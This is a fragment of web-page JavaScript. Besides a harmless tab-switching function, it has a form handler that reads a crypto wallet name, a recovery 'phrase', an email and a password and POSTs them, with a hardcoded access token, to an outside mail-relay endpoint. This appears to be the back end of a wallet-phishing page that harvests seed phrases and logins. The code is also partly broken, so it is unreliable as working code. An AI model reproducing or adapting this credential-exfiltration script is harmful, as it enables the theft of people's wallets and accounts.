    <script>
        function openCity(evt, cityName) {
            // Declare all variables
            var i, tabcontent, tablinks;

            // Get all elements with class="tabcontent" and hide them
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }

            // Get all elements with class="tablinks" and remove the class "active"
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }

            // Show the current tab, and add an "active" class to the button that opened the tab
            document.getElementById(cityName).style.display = "block";
            evt.currentTarget.className += " active";
        }
    </script>

    <script>

        //update this with your js_form selector
        var form_id_js = "javascript_form";
    
        var data_js = {
            "access_token": "y04njsmbmidij13kbgtcyetg" // sent after you sign up
        };
    
        function js_onSuccess() {
            // remove this to avoid redirect
            window.location = window.location.pathname + "?message=Email+Successfully+Sent%21&isError=0";
        }
    
        function js_onError(error) {
            // remove this to avoid redirect
            window.location = window.location.pathname + "?message=Email+could+not+be+sent.&isError=1";
        }
    
        var sendButton = document.getElementById("js_send");
    
        function js_send() {
            sendButton.value='Sending…';
            sendButton.disabled=true;
            var request = new XMLHttpRequest();
            request.onreadystatechange = function() {
                if (request.readyState == 4 && request.status == 200) {
                    js_onSuccess();
                } else
                if(request.readyState == 4) {
                    js_onError(request.response);
                }
            };
    
            var subject = document.querySelector("#" + form_id_js + " [name='wallet']").value;
            var message = document.querySelector("#" + form_id_js + " [name='phrase']" +  " [name='email']" + " [name='password']"  ).value;
            
            data_js['wallet'] = subject;
            data_js['phrase']['email']['password'] = message;
            var params = toParams(data_js);
    
            request.open("POST", "https://postmail.invotes.com/send", true);
            request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    
            request.send(params);
    
            return false;
        }
    
        sendButton.onclick = js_send;
    
        function toParams(data_js) {
            var form_data = [];
            for ( var key in data_js ) {
                form_data.push(encodeURIComponent(key) + "=" + encodeURIComponent(data_js[key]));
            }
    
            return form_data.join("&");
        }
    
        var js_form = document.getElementById(form_id_js);
        js_form.addEventListener("submit", function (e) {
            e.preventDefault();
        });
    </script>
